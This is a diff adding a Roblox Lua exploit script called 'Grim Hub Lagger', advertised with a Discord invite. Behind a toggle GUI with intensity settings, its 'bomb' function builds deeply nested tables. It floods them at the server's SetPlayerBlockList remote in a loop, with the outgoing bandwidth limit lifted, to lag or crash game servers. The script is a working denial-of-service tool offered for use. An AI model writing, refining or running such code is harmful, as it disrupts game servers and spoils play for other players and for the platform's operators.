@@ -1,0 +1,293 @@
+--// Grim Hub Lagger
+--// discord.gg/r9w9szEWZk
+--// 1:1 GUI | PRADA Lag Engine
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local player = Players.LocalPlayer
+
+--// ============================
+--//  COLORS (1:1 FROM IMAGE)
+--// ============================
+local C = {
+    MainBg           = Color3.fromRGB(8, 8, 8),
+    Border           = Color3.fromRGB(210, 40, 40),
+    TextRed          = Color3.fromRGB(220, 50, 50),
+    TextMuted        = Color3.fromRGB(90, 30, 30),
+    RowBg            = Color3.fromRGB(14, 14, 14),
+    ToggleTrack      = Color3.fromRGB(22, 22, 22),
+    ToggleKnob       = Color3.fromRGB(200, 45, 45),
+    BtnSelectedBg    = Color3.fromRGB(18, 5, 5),
+    BtnSelectedBorder= Color3.fromRGB(210, 40, 40),
+    BtnUnselectedBg  = Color3.fromRGB(22, 22, 22),
+    BtnUnselectedBorder = Color3.fromRGB(45, 45, 45),
+    BtnUnselectedText   = Color3.fromRGB(85, 30, 30),
+}
+
+--// ============================
+--//  LAG ENGINE (PRADA)
+--// ============================
+local isTouch = UserInputService.TouchEnabled
+local waitTime = isTouch and 5.8 or 0.25
+local laggerActive = false
+local lagThread = nil
+
+-- Intensity values (High capped at 270 — the proven max from PRADA V1)
+local values = { Low = 100, Mid = 200, High = 270 }
+
+local function bomb(amt)
+    local main, spam = {}, {{}}
+    local z = spam[1]
+    for i = 1, amt do
+        local t = {}
+        table.insert(z, t)
+        z = t
+    end
+    local max = math.min(499999 / (amt + 2), 1500)
+    for i = 1, max do
+        table.insert(main, spam)
+    end
+    pcall(function()
+        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
+    end)
+end
+
+--// ============================
+--//  UI SETUP
+--// ============================
+if CoreGui:FindFirstChild("GrimHubLagger") then
+    CoreGui.GrimHubLagger:Destroy()
+end
+
+local sg = Instance.new("ScreenGui")
+sg.Name = "GrimHubLagger"
+sg.ResetOnSpawn = false
+sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+sg.Parent = CoreGui
+
+-- Main Frame (300x250)
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 300, 0, 250)
+main.Position = UDim2.new(0.5, -150, 0.5, -125)
+main.BackgroundColor3 = C.MainBg
+main.BorderSizePixel = 0
+main.Parent = sg
+
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)
+
+local stroke = Instance.new("UIStroke", main)
+stroke.Color = C.Border
+stroke.Thickness = 3
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+-- Icon
+local icon = Instance.new("TextLabel", main)
+icon.Size = UDim2.new(0, 28, 0, 28)
+icon.Position = UDim2.new(0, 12, 0, 10)
+icon.BackgroundTransparency = 1
+icon.Text = "💀"
+icon.TextColor3 = C.TextRed
+icon.TextSize = 22
+icon.Font = Enum.Font.GothamBold
+
+-- Title
+local title = Instance.new("TextLabel", main)
+title.Size = UDim2.new(0, 160, 0, 20)
+title.Position = UDim2.new(0, 46, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = "Grim Hub Lagger"
+title.TextColor3 = C.TextRed
+title.TextSize = 15
+title.Font = Enum.Font.GothamBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Discord
+local discord = Instance.new("TextLabel", main)
+discord.Size = UDim2.new(0, 130, 0, 18)
+discord.Position = UDim2.new(1, -142, 0, 11)
+discord.BackgroundTransparency = 1
+discord.Text = ".gg/r9w9szEWZk"
+discord.TextColor3 = C.TextRed
+discord.TextSize = 12
+discord.Font = Enum.Font.Gotham
+discord.TextXAlignment = Enum.TextXAlignment.Right
+
+-- OFF Status
+local status = Instance.new("TextLabel", main)
+status.Name = "Status"
+status.Size = UDim2.new(0, 40, 0, 18)
+status.Position = UDim2.new(0, 14, 0, 46)
+status.BackgroundTransparency = 1
+status.Text = "OFF"
+status.TextColor3 = C.TextRed
+status.TextSize = 13
+status.Font = Enum.Font.GothamBold
+status.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Lagger Row
+local row = Instance.new("Frame", main)
+row.Size = UDim2.new(1, -28, 0, 44)
+row.Position = UDim2.new(0, 14, 0, 72)
+row.BackgroundColor3 = C.RowBg
+row.BorderSizePixel = 0
+
+Instance.new("UICorner", row).CornerRadius = UDim.new(0, 10)
+
+local rowLabel = Instance.new("TextLabel", row)
+rowLabel.Size = UDim2.new(0, 100, 1, 0)
+rowLabel.Position = UDim2.new(0, 14, 0, 0)
+rowLabel.BackgroundTransparency = 1
+rowLabel.Text = "Lagger"
+rowLabel.TextColor3 = C.TextRed
+rowLabel.TextSize = 15
+rowLabel.Font = Enum.Font.Gotham
+rowLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Toggle Track
+local track = Instance.new("Frame", row)
+track.Size = UDim2.new(0, 48, 0, 26)
+track.Position = UDim2.new(1, -62, 0.5, -13)
+track.BackgroundColor3 = C.ToggleTrack
+track.BorderSizePixel = 0
+
+Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
+
+-- Knob — STARTS LEFT (OFF position)
+local knob = Instance.new("Frame", track)
+knob.Size = UDim2.new(0, 20, 0, 20)
+knob.Position = UDim2.new(0, 2, 0.5, -10)
+knob.BackgroundColor3 = C.ToggleKnob
+knob.BorderSizePixel = 0
+
+Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
+
+-- Intensity Label
+local intLabel = Instance.new("TextLabel", main)
+intLabel.Size = UDim2.new(0, 80, 0, 18)
+intLabel.Position = UDim2.new(0, 14, 0, 124)
+intLabel.BackgroundTransparency = 1
+intLabel.Text = "Intensity"
+intLabel.TextColor3 = C.TextRed
+intLabel.TextSize = 13
+intLabel.Font = Enum.Font.GothamBold
+intLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Buttons Container
+local btnContainer = Instance.new("Frame", main)
+btnContainer.Size = UDim2.new(1, -28, 0, 40)
+btnContainer.Position = UDim2.new(0, 14, 0, 148)
+btnContainer.BackgroundTransparency = 1
+
+local list = Instance.new("UIListLayout", btnContainer)
+list.FillDirection = Enum.FillDirection.Horizontal
+list.HorizontalAlignment = Enum.HorizontalAlignment.Center
+list.VerticalAlignment = Enum.VerticalAlignment.Center
+list.Padding = UDim.new(0, 8)
+
+-- Intensity Buttons
+local selected = "Low"
+local refs = {}
+
+for _, level in ipairs({"Low", "Mid", "High"}) do
+    local btn = Instance.new("TextButton", btnContainer)
+    btn.Name = level
+    btn.Size = UDim2.new(1/3, -6, 1, 0)
+    btn.Text = level
+    btn.TextSize = 13
+    btn.Font = Enum.Font.GothamBold
+    btn.BorderSizePixel = 0
+    btn.AutoButtonColor = false
+
+    local isSel = (level == selected)
+    btn.BackgroundColor3 = isSel and C.BtnSelectedBg or C.BtnUnselectedBg
+    btn.TextColor3 = isSel and C.TextRed or C.BtnUnselectedText
+
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
+
+    local str = Instance.new("UIStroke", btn)
+    str.Color = isSel and C.BtnSelectedBorder or C.BtnUnselectedBorder
+    str.Thickness = 2
+    str.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+    refs[level] = {Btn = btn, Stroke = str}
+
+    btn.MouseButton1Click:Connect(function()
+        selected = level
+        for name, ref in pairs(refs) do
+            local sel = (name == selected)
+            ref.Btn.BackgroundColor3 = sel and C.BtnSelectedBg or C.BtnUnselectedBg
+            ref.Btn.TextColor3 = sel and C.TextRed or C.BtnUnselectedText
+            ref.Stroke.Color = sel and C.BtnSelectedBorder or C.BtnUnselectedBorder
+        end
+    end)
+
+    btn.MouseEnter:Connect(function()
+        if level ~= selected then btn.BackgroundColor3 = Color3.fromRGB(35, 35, 35) end
+    end)
+    btn.MouseLeave:Connect(function()
+        if level ~= selected then btn.BackgroundColor3 = C.BtnUnselectedBg end
+    end)
+end
+
+--// ============================
+--//  TOGGLE LOGIC
+--// ============================
+local function toggle()
+    laggerActive = not laggerActive
+
+    if laggerActive then
+        -- Knob moves RIGHT, Status ON
+        TweenService:Create(knob, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            Position = UDim2.new(1, -22, 0.5, -10)
+        }):Play()
+        status.Text = "ON"
+        status.TextColor3 = Color3.fromRGB(255, 60, 60)
+
+        lagThread = task.spawn(function()
+            while laggerActive do
+                pcall(function()
+                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+                end)
+                bomb(values[selected])
+                task.wait(waitTime)
+            end
+        end)
+    else
+        -- Knob moves LEFT (back to OFF), Status OFF
+        TweenService:Create(knob, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            Position = UDim2.new(0, 2, 0.5, -10)
+        }):Play()
+        status.Text = "OFF"
+        status.TextColor3 = C.TextRed
+
+        if lagThread then task.cancel(lagThread) lagThread = nil end
+    end
+end
+
+row.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        toggle()
+    end
+end)
+
+--// ============================
+--//  DRAGGING
+--// ============================
+local dragging, dragStart, startPos = false, nil, nil
+
+main.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = main.Position
+    end
+end)
+
+main.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
